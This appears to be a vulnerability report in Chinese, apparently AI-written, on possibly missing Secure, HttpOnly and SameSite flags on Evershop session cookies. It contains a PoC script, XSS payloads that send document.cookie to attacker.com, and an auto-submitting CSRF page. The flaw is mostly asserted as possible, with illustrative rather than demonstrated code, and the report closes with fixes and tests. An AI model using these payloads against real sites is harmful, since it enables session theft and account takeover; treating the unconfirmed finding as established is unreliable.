# Evershop Session Cookie 安全属性配置漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：安全配置错误 (CWE-16) / 敏感Cookie未设安全属性 (CWE-614)
- **漏洞名称**：Evershop Session Cookie 安全属性配置不当漏洞
- **风险等级**：中危
- **概述**：Evershop的会话Cookie可能未正确配置`Secure`、`HttpOnly`、`SameSite`等安全属性。这可能导致会话劫持、跨站脚本攻击窃取Cookie、跨站请求伪造等安全问题。结合VULN-009中发现的弱默认Cookie Secret，会话安全风险进一步加剧。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：取决于具体攻击向量
- **操作条件**：
  1. 能够执行中间人攻击（针对缺失Secure属性）
  2. 存在XSS漏洞（针对缺失HttpOnly属性）
  3. 用户访问恶意网站（针对缺失SameSite属性）
- **攻击特征**：窃取或利用不安全的会话Cookie

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **会话劫持**：通过网络嗅探获取会话Cookie（缺失Secure）
2. **XSS Cookie窃取**：通过JavaScript读取Cookie（缺失HttpOnly）
3. **CSRF攻击**：跨站请求自动携带Cookie（缺失SameSite）
4. **账户接管**：使用窃取的Cookie冒充用户

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：分析Cookie配置**

分析Evershop的会话中间件配置，检查Cookie安全属性设置。

```javascript
// 典型的不安全配置示例
app.use(session({
  secret: getCookieSecret(),  // 可能是弱密钥 (VULN-009)
  cookie: {
    // secure: false,     // 缺失或设为false
    // httpOnly: false,   // 缺失或设为false
    // sameSite: 'lax',   // 可能未设置为'strict'
    maxAge: 24 * 60 * 60 * 1000
  }
}));
```

**步骤2：检查实际Cookie属性**

```bash
# 发起请求并检查Set-Cookie响应头
curl -v 'https://target.com/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@example.com","password":"test"}' 2>&1 | grep -i set-cookie
```

**预期不安全响应**：
```
Set-Cookie: session=abc123; Path=/; Max-Age=86400
```

**安全配置应该是**：
```
Set-Cookie: session=abc123; Path=/; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
```

**步骤3：验证各安全属性缺失的影响**

**3.1 缺失Secure属性 - HTTP传输Cookie**
```bash
# 如果网站同时支持HTTP，Cookie可能在HTTP中传输
curl -v 'http://target.com/' 2>&1 | grep -i cookie
```

**3.2 缺失HttpOnly属性 - JavaScript可读取**
```javascript
// 如果存在XSS漏洞，攻击者可执行
document.location = 'https://attacker.com/steal?c=' + document.cookie;
```

**3.3 缺失SameSite属性 - CSRF可利用**
```html
<!-- 恶意网站上的表单 -->
<form action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Session Cookie Security Analysis PoC
"""

import requests
import re

class CookieSecurityAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []

    def analyze_cookie_security(self, endpoint='/'):
        """
        分析Cookie安全属性
        """
        print(f"[*] 分析目标: {self.target_url}{endpoint}")

        response = requests.get(f"{self.target_url}{endpoint}", allow_redirects=False)

        # 获取所有Set-Cookie头
        cookies = response.headers.get('Set-Cookie', '')
        if not cookies:
            print("[-] 未发现Set-Cookie头")
            return

        print(f"\n[*] 原始Cookie头:\n{cookies}\n")

        # 分析每个Cookie
        self._analyze_cookie_attributes(cookies)

        return self.vulnerabilities

    def _analyze_cookie_attributes(self, cookie_header):
        """
        分析Cookie属性
        """
        cookie_parts = cookie_header.split(';')
        cookie_name = cookie_parts[0].split('=')[0].strip()

        print(f"[*] 分析Cookie: {cookie_name}")

        # 转换为小写进行检查
        cookie_lower = cookie_header.lower()

        # 检查Secure属性
        if 'secure' not in cookie_lower:
            vuln = f"Cookie '{cookie_name}' 缺失 Secure 属性 - 可能在HTTP中传输"
            print(f"    [!] {vuln}")
            self.vulnerabilities.append({'type': 'missing_secure', 'cookie': cookie_name})

        # 检查HttpOnly属性
        if 'httponly' not in cookie_lower:
            vuln = f"Cookie '{cookie_name}' 缺失 HttpOnly 属性 - JavaScript可读取"
            print(f"    [!] {vuln}")
            self.vulnerabilities.append({'type': 'missing_httponly', 'cookie': cookie_name})

        # 检查SameSite属性
        if 'samesite' not in cookie_lower:
            vuln = f"Cookie '{cookie_name}' 缺失 SameSite 属性 - 可能存在CSRF风险"
            print(f"    [!] {vuln}")
            self.vulnerabilities.append({'type': 'missing_samesite', 'cookie': cookie_name})
        elif 'samesite=none' in cookie_lower:
            vuln = f"Cookie '{cookie_name}' SameSite=None - 跨站请求会携带Cookie"
            print(f"    [!] {vuln}")
            self.vulnerabilities.append({'type': 'samesite_none', 'cookie': cookie_name})

        # 检查Path属性
        if 'path=/' in cookie_lower:
            print(f"    [*] Path=/ (全站有效)")

        # 检查Max-Age或Expires
        if 'max-age' in cookie_lower or 'expires' in cookie_lower:
            print(f"    [*] 设置了过期时间")
        else:
            print(f"    [*] 会话Cookie (浏览器关闭后过期)")


class SessionHijacker:
    """
    会话劫持演示 (需要中间人位置)
    """

    def steal_via_xss(self):
        """
        XSS窃取Cookie的payload
        """
        payloads = [
            # 基本窃取
            '<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>',

            # 使用fetch
            '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',

            # 编码绕过
            '<img src=x onerror="location=\'https://attacker.com/steal?c=\'+document.cookie">',
        ]
        return payloads

    def csrf_exploit(self, target_action):
        """
        生成CSRF攻击页面
        """
        html = f'''
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<h1>Please wait...</h1>
<form id="csrf" action="{target_action}" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker_account">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
'''
        return html


def main():
    target = "https://shop.example.com"

    analyzer = CookieSecurityAnalyzer(target)

    print("=" * 60)
    print(" Session Cookie Security Analysis PoC")
    print("=" * 60)
    print()

    # 分析主页Cookie
    vulns = analyzer.analyze_cookie_security('/')

    # 分析登录后Cookie
    print("\n" + "=" * 60)
    print(" 登录接口Cookie分析")
    print("=" * 60)
    analyzer.analyze_cookie_security('/api/customer/tokens')

    # 总结
    print("\n" + "=" * 60)
    print(" 安全分析总结")
    print("=" * 60)

    if vulns:
        print(f"\n[!] 发现 {len(vulns)} 个Cookie安全问题:")
        for v in vulns:
            print(f"    - {v['type']}: {v['cookie']}")

        # 生成攻击演示
        print("\n[*] 潜在攻击演示:")

        hijacker = SessionHijacker()

        if any(v['type'] == 'missing_httponly' for v in vulns):
            print("\n    XSS Cookie窃取Payload:")
            for payload in hijacker.steal_via_xss()[:2]:
                print(f"    {payload[:80]}...")

        if any(v['type'] in ['missing_samesite', 'samesite_none'] for v in vulns):
            print("\n    CSRF攻击页面已生成")
    else:
        print("\n[+] Cookie安全配置良好!")


if __name__ == "__main__":
    main()
```

### 4.2 会话固定攻击检测

```python
def check_session_fixation(target_url):
    """
    检测会话固定漏洞
    """
    session = requests.Session()

    # 1. 获取初始会话ID
    response1 = session.get(f"{target_url}/")
    initial_session = session.cookies.get('session')
    print(f"[*] 初始会话ID: {initial_session}")

    # 2. 执行登录
    login_response = session.post(f"{target_url}/api/login", json={
        'email': 'test@example.com',
        'password': 'testpass'
    })

    # 3. 检查会话ID是否改变
    new_session = session.cookies.get('session')
    print(f"[*] 登录后会话ID: {new_session}")

    if initial_session == new_session:
        print("[!] 会话固定漏洞! 登录后会话ID未更新")
        return True
    else:
        print("[+] 登录后会话ID已更新，不存在会话固定漏洞")
        return False
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              Cookie安全属性缺失攻击场景                          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  场景1: 缺失Secure属性 - 中间人攻击                             │
│  ┌─────────────────────────────────────────┐                  │
│  │ 用户 → [HTTP] → 中间人 → 服务器          │                  │
│  │       ↑                                 │                  │
│  │       └── Cookie在HTTP中明文传输        │                  │
│  │           攻击者可嗅探获取会话          │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
│  场景2: 缺失HttpOnly属性 - XSS窃取                              │
│  ┌─────────────────────────────────────────┐                  │
│  │ 恶意脚本: document.cookie               │                  │
│  │     ↓                                   │                  │
│  │ 读取会话Cookie → 发送到攻击者服务器      │                  │
│  │     ↓                                   │                  │
│  │ 攻击者使用Cookie冒充用户                 │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
│  场景3: 缺失SameSite属性 - CSRF攻击                             │
│  ┌─────────────────────────────────────────┐                  │
│  │ 用户访问恶意网站                         │                  │
│  │     ↓                                   │                  │
│  │ 恶意网站发起跨站请求                     │                  │
│  │     ↓                                   │                  │
│  │ 浏览器自动携带Cookie                     │                  │
│  │     ↓                                   │                  │
│  │ 目标网站执行非预期操作                   │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **默认配置不安全**：Cookie配置未显式设置安全属性
2. **安全意识不足**：开发时未考虑Cookie安全最佳实践
3. **缺乏安全审计**：未定期检查Cookie配置
4. **框架默认值**：依赖框架默认值而非显式配置

## 6. 修复建议

### 6.1 方案A：完整Cookie安全配置

```javascript
// 会话中间件配置
app.use(session({
  secret: getSecureCookieSecret(),  // 使用强随机密钥
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',  // 生产环境强制HTTPS
    httpOnly: true,                                  // 防止JS访问
    sameSite: 'strict',                              // 严格同站策略
    maxAge: 24 * 60 * 60 * 1000,                    // 24小时过期
    path: '/',
    domain: process.env.COOKIE_DOMAIN || undefined
  },
  name: 'sessionId',  // 自定义Cookie名称
  rolling: true       // 每次请求刷新过期时间
}));
```

### 6.2 方案B：环境感知配置

```javascript
const cookieConfig = {
  development: {
    secure: false,
    httpOnly: true,
    sameSite: 'lax'
  },
  production: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict'
  }
};

const env = process.env.NODE_ENV || 'development';
app.use(session({
  secret: getSecureCookieSecret(),
  cookie: cookieConfig[env]
}));
```

### 6.3 方案C：添加安全响应头

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: true,
  xssFilter: true,
  noSniff: true,
  frameguard: { action: 'deny' },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true
  }
}));
```

### 6.4 安全测试用例

```javascript
describe('Cookie Security', () => {
  it('should set Secure flag on session cookie in production', async () => {
    const response = await request(app)
      .get('/')
      .set('X-Forwarded-Proto', 'https');

    const cookies = response.headers['set-cookie'];
    expect(cookies.some(c => c.includes('Secure'))).toBe(true);
  });

  it('should set HttpOnly flag on session cookie', async () => {
    const response = await request(app).get('/');
    const cookies = response.headers['set-cookie'];
    expect(cookies.some(c => c.includes('HttpOnly'))).toBe(true);
  });

  it('should set SameSite=Strict on session cookie', async () => {
    const response = await request(app).get('/');
    const cookies = response.headers['set-cookie'];
    expect(cookies.some(c => c.includes('SameSite=Strict'))).toBe(true);
  });

  it('should regenerate session ID after login', async () => {
    const agent = request.agent(app);

    // Get initial session
    const res1 = await agent.get('/');
    const initialSession = res1.headers['set-cookie'];

    // Login
    await agent.post('/api/login').send({
      email: 'test@example.com',
      password: 'password'
    });

    // Session should be different
    const res2 = await agent.get('/');
    const newSession = res2.headers['set-cookie'];

    expect(initialSession).not.toEqual(newSession);
  });
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
